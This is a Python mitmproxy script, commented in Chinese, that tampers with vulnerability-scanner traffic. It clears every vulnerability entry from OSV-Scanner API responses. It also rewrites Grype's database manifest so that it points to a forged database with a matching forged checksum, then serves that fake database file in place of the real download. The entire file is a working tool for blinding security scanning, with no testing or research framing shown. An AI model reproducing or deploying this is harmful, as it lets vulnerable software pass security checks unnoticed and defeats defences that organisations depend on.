import json
import hashlib
import os
import logging
from mitmproxy import http

# ================= 配置區 =================
# 在 Docker 容器內，掛載的路徑通常是 /app/
FAKE_DB_FILE = "/app/vulnerability_copy-db.tar.zst"
# ==========================================

def get_sha256(file_path):
    """計算本地偽造資料庫的 SHA256"""
    if not os.path.exists(file_path):
        print(f"[ERROR] 找不到偽造資料庫檔案: {file_path}", flush=True)
        return None
    sha256_hash = hashlib.sha256()
    try:
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    except Exception as e:
        print(f"[ERROR] 雜湊計算失敗: {e}", flush=True)
        return None

# 初始化：一次讀入 bytes + 計算 checksum，避免每次請求重讀大檔
def _load_db():
    if not os.path.exists(FAKE_DB_FILE):
        print(f"[ERROR] 找不到偽造資料庫檔案: {FAKE_DB_FILE}", flush=True)
        return None, None
    with open(FAKE_DB_FILE, "rb") as f:
        data = f.read()
    return data, hashlib.sha256(data).hexdigest()

DB_BYTES, hex_digest = _load_db()
DB_SIZE = len(DB_BYTES) if DB_BYTES else 0
NEW_CHECKSUM = f"sha256:{hex_digest}" if hex_digest else ""

def request(flow: http.HTTPFlow):
    url = flow.request.pretty_url

    # 【核心 2】攔截針對偽造檔名的下載請求
    if "fake-vulnerability-db.tar.zst" in url:
        method = flow.request.method
        if DB_BYTES is None:
            print("[-] 錯誤：由於找不到來源檔案，無法進行注入", flush=True)
            return

        headers = {
            "Content-Type": "application/zstd",
            "Content-Length": str(DB_SIZE),
            "Accept-Ranges": "bytes",
            "ETag": f'"{hex_digest[:16]}"',
            "Last-Modified": "Mon, 13 Apr 2026 00:00:00 GMT",
        }

        # HEAD 不能回 body，只能回 headers
        if method == "HEAD":
            flow.response = http.Response.make(200, b"", headers)
            print(f"[HEAD] 回覆探測請求 (Content-Length={DB_SIZE})", flush=True)
            return

        print(f"\n[!!!] 偵測到 Grype GET 下載請求，正在注入本地二進位檔案...", flush=True)
        flow.response = http.Response.make(200, DB_BYTES, headers)
        print(f"[SUCCESS] 成功餵食假資料庫！大小: {DB_SIZE} bytes", flush=True)

def response(flow: http.HTTPFlow):
    url = flow.request.pretty_url
    
    # 【核心 1】OSV-Scanner 竄改 (探針用)
    if "api.osv.dev" in url:
        try:
            data = json.loads(flow.response.get_text())
            modified = False
            if "results" in data:
                for item in data["results"]:
                    if "vulns" in item:
                        item["vulns"] = []
                        modified = True
            
            if modified:
                flow.response.set_text(json.dumps(data))
                print(f">>> [SUCCESS] OSV-Scanner 漏洞已清空，憑證驗證通過！", flush=True)
        except Exception as e:
            print(f"[ERROR] OSV 竄改失敗 (可能是非 JSON 回應): {e}", flush=True)

    # 【核心 2】Grype latest.json 竄改
    if "databases/v6/latest.json" in url:
        try:
            print(f"\n[!!!] 正在竄改 Grype latest.json...", flush=True)
            data = json.loads(flow.response.get_text())
            
            # 修改下載路徑為我們預設的攔截關鍵字
            # 使用相對路徑，讓 Grype 自動拼接到 https://grype.anchore.io/
            data["path"] = "fake-vulnerability-db.tar.zst"
            
            if hex_digest:
                data["checksum"] = NEW_CHECKSUM
                print(f"[+] 注入偽造 Checksum: {NEW_CHECKSUM}", flush=True)
            
            # 確保資料庫版本看起來是最新的
            data["built"] = "2026-04-13T00:00:00Z"
            
            flow.response.set_text(json.dumps(data))
            print(f"[SUCCESS] Grype 清單竄改完成！", flush=True)
        except Exception as e:
            print(f"[ERROR] Grype 清單竄改失敗: {e}", flush=True)